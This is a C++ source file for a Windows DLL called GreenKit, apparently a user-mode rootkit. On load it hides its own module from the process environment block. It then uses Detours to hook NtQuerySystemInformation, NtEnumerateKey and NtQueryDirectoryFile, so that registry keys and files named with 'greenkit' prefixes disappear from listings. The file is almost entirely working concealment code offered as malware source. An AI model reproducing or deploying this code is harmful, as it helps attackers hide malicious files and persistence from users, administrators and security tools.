/*#include "stdafx.h"
#include "windefs.h"
#include "hooking.h"

#include "NtQuerySystemInformation.h"
#include "NtEnumerateKey.h"
#include "FindFiles.h"*/

// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <windows.h>
#include "Detours.h"
#include "el_win_structs.h"
#include "NtQueryDirectoryFile.h"
//#include "NtEnumerateKey.h"

#include <shlwapi.h>
#include <winsock2.h>
#include "NtQuerySystemInformation.h"
#include "GreenKit.h"

#define REGKEY "SOFTWARE\\example\\example"
#define REGKEY_VALUE "explorer"
#define FILE_TAG "EXAMPLE"

BOOL _strCmp(const char *str1, const char *str2, int size) {
	int i = 0;
	for (i = 0; str1[i] && i < size; ++i) {
		if (str2[i] != str1[i])
			return FALSE;
	}

	return TRUE;
}

BOOL _strCmpC(const char *str1, const char *str2, int size) {
	int i = 0;
	for (i = 0; str1[i] && i < size; ++i) {
		if (str2[i] > str1[i])
			return FALSE;
	}

	return TRUE;
}


VOID WriteFile(char token)
{
    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    DWORD dwBytesWritten = 0;
    char Str[] = "hook regedit";
    WriteFile(hFile, Str + token, strlen(Str + token), &dwBytesWritten, NULL);
}

typedef DWORD(NTAPI *elNtQuerySystemInformation)(DWORD i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

typedef HANDLE(WINAPI *FFFEx)(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);

FFFEx oldFFFEx;
FFFEx originalFFFEx;

typedef BOOL(WINAPI *FNFW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata);

typedef NTSTATUS(WINAPI* TD_NtQueryDirectoryFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);


FNFW oldFNFW;
FNFW originalFNFW;

TD_NtQueryDirectoryFile oldNtQueryDirectoryFile;
TD_NtQueryDirectoryFile originalNtQueryDirectoryFile;

/* NT ENUMERATE KEY */

typedef NTSTATUS(WINAPI *TD_NtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);

NTSTATUS NTAPI NewNtEnumerateKey(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI *TD_NtOpenKey)(
    OUT PHANDLE  KeyHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes
    );

TD_NtEnumerateKey oldNtEnumerateKey;
TD_NtEnumerateKey originalNtEnumerateKey;

typedef LONG (WINAPI *TD_RtlCompareUnicodeString)(
    _In_ PCUNICODE_STRING String1,
    _In_ PCUNICODE_STRING String2,
    _In_ BOOLEAN          CaseInSensitive
    );

typedef NTSTATUS(WINAPI * TD_RtlAnsiStringToUnicodeString)(
    _Inout_ PUNICODE_STRING DestinationString,
    _In_    PCANSI_STRING   SourceString,
    _In_    BOOLEAN         AllocateDestinationString
    );

typedef NTSTATUS(WINAPI * TD_RtlUniStringToAnsiString)(
    _Inout_ PCANSI_STRING DestinationString,
    _In_    PUNICODE_STRING   SourceString,
    _In_    BOOLEAN         AllocateDestinationString
    );

typedef VOID(NTAPI *TD_RtlFreeAnsiString)(
    PANSI_STRING AnsiString
);

typedef NTSTATUS(NTAPI *TD_NtClose)(
    IN HANDLE Handle
    );

typedef VOID(NTAPI *TD_FreeAnsiString)(
    PANSI_STRING AnsiString
    );

BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
	std::string c("greenkit");
	char str[500];
	wcstombs(str, uStr_reg.Buffer, 500);
	
	if (_strCmpC(c.c_str(), str, 8))
		return TRUE;
	else
		return FALSE;
}

BOOL mustHideReg(UNICODE_STRING uStr_reg) {
	std::string c("greenkit");
	char str[500];
	wcstombs(str, uStr_reg.Buffer, 500);
	if (_strCmp(str, c.c_str(), 8))
		return TRUE;
	else
		return FALSE;
}

PVOID getKeyName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
    if (KeyInformationClass == KeyBasicInformation)
        return (PVOID)&(((PKEY_BASIC_INFORMATION)KeyInformation)->Name);
    else if (KeyInformationClass == KeyNodeInformation)
        return (PVOID)&(((PKEY_NODE_INFORMATION)KeyInformation)->Name);
    return NULL;
}

ULONG getKeyNameLength(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
    if (KeyInformationClass == KeyBasicInformation)
        return ((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
    else if (KeyInformationClass == KeyNodeInformation)
        return ((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
    return 0;
}

/* Return the name of the specified registrykey entry. */

PVOID getKeyEntryName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass)
{
    PVOID pvResult = NULL;

    switch (KeyInformationClass)
    {
    case KeyBasicInformation:
        pvResult = (PVOID)&((PKEY_BASIC_INFORMATION)KeyInformation)->Name;
        break;
    case KeyNodeInformation:
        pvResult = (PVOID)&((PKEY_NODE_INFORMATION)KeyInformation)->Name;
        break;
    }

    return pvResult;
}

NTSTATUS WINAPI NewNtOpenFile(
    PHANDLE				phFile,
    ACCESS_MASK			DesiredAccess,
    POBJECT_ATTRIBUTES	ObjectAttributes,
    PIO_STATUS_BLOCK	IoStatusBlock,
    ULONG				ShareAccess,
    ULONG				OpenOptions)
{
    TCHAR sPath[MAX_PATH];
    //DWORD dwRet;
    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);

    //if (!mustHideFile(*sPath))
    //NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

    return 0;//status; // STATUS_NO_SUCH_FILE
}

ULONG getKeyEntryNameLength(PVOID KeyInformation,KEY_INFORMATION_CLASS KeyInformationClass)
{
	ULONG ulResult=0;

	switch(KeyInformationClass)
	{
		case KeyBasicInformation:
			ulResult=((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
			break;
		case KeyNodeInformation:
			ulResult=((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
			break;
	}

	return ulResult;
}

NTSTATUS WINAPI NewNtEnumerateKey(
	HANDLE KeyHandle,
	ULONG Index,
	KEY_INFORMATION_CLASS KeyInformationClass,
	PVOID KeyInformation,
	ULONG Length,
	PULONG ResultLength
	)
{
	NTSTATUS rc;
	ULONG Shift = 0;

	if (KeyInformationClass == KeyBasicInformation ||
		KeyInformationClass == KeyNodeInformation)
	{
		OBJECT_ATTRIBUTES ObjectAttributes;
		UNICODE_STRING dbg, usKey;
		ANSI_STRING asKey;
		ULONG tmpIndex, i = 0;
		BOOL bFound = FALSE;
		HANDLE hTmp;

		// call original function
		rc = originalNtEnumerateKey(
			KeyHandle,
			Index,
			KeyInformationClass,
			KeyInformation,
			Length,
			ResultLength
			);

		if (NT_SUCCESS(rc))
		{
			dbg.Buffer = (LPWSTR) getKeyEntryName(KeyInformation, KeyInformationClass);
			dbg.Length = (USHORT) getKeyEntryNameLength(KeyInformation, KeyInformationClass);

			if (mustShiftReg(dbg))
				{
					InitializeObjectAttributes(&ObjectAttributes, &usKey, 0, KeyHandle, NULL);
					TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
					NTSTATUS status;
					if (_NtOpenKey(&hTmp, GENERIC_READ, &ObjectAttributes) == STATUS_SUCCESS)
					{
						Shift++;
						CloseHandle(hTmp);
					}
				}

			}

			if (Shift)
			{
				ULONG Shoft = Shift;
				tmpIndex = Index + 1;
				do
				{	// check how many keys there are before our shifted key
					Shoft--;
					rc = originalNtEnumerateKey(
						KeyHandle,
						tmpIndex++,
						KeyInformationClass,
						KeyInformation,
						Length,
						ResultLength
						);

					if (rc != STATUS_SUCCESS)
						return(rc);

					dbg.Buffer = (LPWSTR) getKeyEntryName(KeyInformation, KeyInformationClass);
					dbg.Length = (USHORT)getKeyEntryNameLength(KeyInformation, KeyInformationClass);
					bFound = mustHideReg(dbg);
					if (bFound)
						Shift++;
				} while (Shoft>0);

				tmpIndex = Index + Shift;
				do
				{	// check if final key should be hidden
						rc = originalNtEnumerateKey(
						KeyHandle,
						tmpIndex++,
						KeyInformationClass,
						KeyInformation,
						Length,
						ResultLength
						);

					if (rc != STATUS_SUCCESS)
						return(rc);

					dbg.Buffer = (LPWSTR) getKeyEntryName(KeyInformation, KeyInformationClass);
					dbg.Length = (USHORT)getKeyEntryNameLength(KeyInformation, KeyInformationClass);
					bFound = mustHideReg(dbg);
					if (bFound)
						Shift++;
				} while (bFound);
			}
		}

	// call original function
	rc = originalNtEnumerateKey(
		KeyHandle,
		Index + Shift,
		KeyInformationClass,
		KeyInformation,
		Length,
		ResultLength
		);

	return rc;
}


/* NT QUERY DIRECTORY FILE */

BOOL mustHideFile(UNICODE_STRING file) {
	std::string a("greenkit.txt");
	std::string b("greenkit.exe");
	std::string c("_greenkit_");
	char str[500];
	wcstombs(str, file.Buffer, 500);
	if (_strCmp(str, a.c_str(), 12))
		return TRUE;
	else if (_strCmp(str, b.c_str(), 12))
		return TRUE;
	else if (_strCmp(str, c.c_str(), 10))
		return TRUE;
	else
		return FALSE;
}
DWORD getDirEntryLenToNext(
	PVOID FileInformationBuffer,
	FILE_INFORMATION_CLASS FileInfoClass
	)
{
	DWORD dwResult = 0;
	switch (FileInfoClass)
	{
	case FileDirectoryInformation:
		dwResult = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case 2:
		dwResult = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case 38:
		dwResult = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case 3:
		dwResult = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case 37:
		dwResult = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case 12:
		dwResult = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	}
	return dwResult;
}

// Given two directory entries, link them together in a list. 
void setDirEntryLenToNext(
	PVOID FileInformationBuffer,
	FILE_INFORMATION_CLASS FileInfoClass,
	DWORD value
	)
{
	switch (FileInfoClass)
	{
	case FileDirectoryInformation:
		((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case 2:
		((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case 38:
		((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case 3:
		((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case 37:
		((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case 12:
		((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	}
}

// Return the filename of the specified directory entry. 
PVOID getDirEntryFileName(
	PVOID FileInformationBuffer,
	FILE_INFORMATION_CLASS FileInfoClass
	)
{
	PVOID pvResult = NULL;
	switch (FileInfoClass)
	{
	case FileDirectoryInformation:
		pvResult = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case 2:
		pvResult = (PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case 38:
		pvResult = (PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case 3:
		pvResult = (PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case 37:
		pvResult = (PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case 12:
		pvResult = (PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	}
	return pvResult;
}

// Return the length of the filename of the specified directory entry. 
ULONG getDirEntryFileLength(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass)
{
	ULONG ulResult = 0;
	switch (FileInfoClass)
	{
	case FileDirectoryInformation:
		ulResult = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case 2:
		ulResult = (ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case 38:
		ulResult = (ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case 3:
		ulResult = (ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case 37:
		ulResult = (ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case 12:
		ulResult = (ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	}
	return ulResult;
}

// ntdll.NtQueryDirectoryFile
NTSTATUS WINAPI NewNtQueryDirectoryFile(
	HANDLE hFile,
	HANDLE hEvent,
	PIO_APC_ROUTINE IoApcRoutine,
	PVOID IoApcContext,
	PIO_STATUS_BLOCK pIoStatusBlock,
	PVOID FileInformationBuffer,
	ULONG FileInformationBufferLength,
	FILE_INFORMATION_CLASS FileInfoClass,
	BOOLEAN bReturnOnlyOneEntry,
	PUNICODE_STRING PathMask,
	BOOLEAN bRestartQuery
	)
{
	NTSTATUS rc;

	// call original function
	rc = originalNtQueryDirectoryFile(
		hFile,
		hEvent,
		IoApcRoutine,
		IoApcContext,
		pIoStatusBlock,
		FileInformationBuffer,
		FileInformationBufferLength,
		FileInfoClass,
		bReturnOnlyOneEntry,
		PathMask,
		bRestartQuery
		);

	if (NT_SUCCESS(rc) &&
		(FileInfoClass == FileDirectoryInformation ||
		FileInfoClass == 2 ||
		FileInfoClass == 38 ||
		FileInfoClass == 3 ||
		FileInfoClass == 37 ||
		FileInfoClass == 12)
		)
	{
		PVOID p = FileInformationBuffer;
		PVOID pLast = NULL;
		BOOL bLastOne, bFound;
		UNICODE_STRING usName;
		ANSI_STRING asName;
		TD_RtlUniStringToAnsiString _RtlUnicodeStringToAnsiString = (NTSTATUS(WINAPI *)
			(_Inout_ PANSI_STRING DestinationString, _In_ PUNICODE_STRING SourceString,
			_In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
			"RtlUnicodeStringToAnsiString");

		TD_RtlFreeAnsiString  _RtlFreeAnsiString = (VOID(WINAPI *)
			(_In_ PANSI_STRING AnsiString)) GetProcAddress(GetModuleHandle("ntdll.dll"),
			"RtlFreeAnsiString");


		if (bReturnOnlyOneEntry) // if only one entry returned we should give the next if it suppose to be hidden
		{
			usName.Buffer = (PWSTR)getDirEntryFileName(FileInformationBuffer, FileInfoClass);
			usName.Length = (USHORT)getDirEntryFileLength(FileInformationBuffer, FileInfoClass);

			_RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
			bFound = mustHideFile(usName);
			_RtlFreeAnsiString(&asName);

			while (bFound)
			{
				rc = originalNtQueryDirectoryFile(
					hFile,
					hEvent,
					IoApcRoutine,
					IoApcContext,
					pIoStatusBlock,
					FileInformationBuffer,
					FileInformationBufferLength,
					FileInfoClass,
					bReturnOnlyOneEntry,
					PathMask,
					bRestartQuery
					);

				if (rc != STATUS_SUCCESS)
					return(rc);

				usName.Buffer = (PWSTR)getDirEntryFileName(FileInformationBuffer, FileInfoClass);
				usName.Length = (USHORT)getDirEntryFileLength(FileInformationBuffer, FileInfoClass);
				_RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
				bFound = mustHideFile(usName);
				_RtlFreeAnsiString(&asName);
			}
		}
		else // if full list hide the ones that should be hidden
		{
			do
			{
				bLastOne = !getDirEntryLenToNext(p, FileInfoClass);

				// compare directory-name 
				if (getDirEntryFileLength(p, FileInfoClass))
				{
					usName.Buffer = (PWSTR)getDirEntryFileName(p, FileInfoClass);
					usName.Length = (USHORT)getDirEntryFileLength(p, FileInfoClass);
					_RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
					if (mustHideFile(usName))
					{
						_RtlFreeAnsiString(&asName);
						if (bLastOne)
						{
							if (p == FileInformationBuffer) rc = 0x80000006;
							else setDirEntryLenToNext(pLast, FileInfoClass, 0);
							break;
						}
						else
						{
							int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
							int iLeft = (DWORD)FileInformationBufferLength - iPos - getDirEntryLenToNext(p, FileInfoClass);
							RtlCopyMemory(p, (PVOID)((char*)p + getDirEntryLenToNext(p, FileInfoClass)), (DWORD)iLeft);
							continue;
						}
					}
					_RtlFreeAnsiString(&asName);
				}

				pLast = p;
				p = ((char*)p + getDirEntryLenToNext(p, FileInfoClass));
			} while (!bLastOne);
		}
	}

	return rc;
}
/* END NT QUERY DIRECTORY FILE */

	BOOL APIENTRY DllMain(HMODULE hModule,
		DWORD  ul_reason_for_call,
		LPVOID lpReserved
		)
	{
		PELPEB peb = EL_GetPeb();
		EL_HideModule(peb, L"_greenkit_GreenKit.dll");
		HMODULE NtDll = LoadLibrary("ntdll.dll");
		HMODULE Kernel32 = LoadLibrary("kernel32.dll");

        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            SetNtQuery((TD_NtQuerySystemInformation)DetourFunction((PBYTE)(TD_NtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation"), (PBYTE)NewNtQuerySystemInformation));

            originalNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)(TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey"), (PBYTE)NewNtEnumerateKey);

			oldNtQueryDirectoryFile = (TD_NtQueryDirectoryFile)GetProcAddress(NtDll, "NtQueryDirectoryFile");
			originalNtQueryDirectoryFile = (TD_NtQueryDirectoryFile)DetourFunction((PBYTE)oldNtQueryDirectoryFile, (PBYTE)NewNtQueryDirectoryFile);
        
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		}
		return TRUE;
	}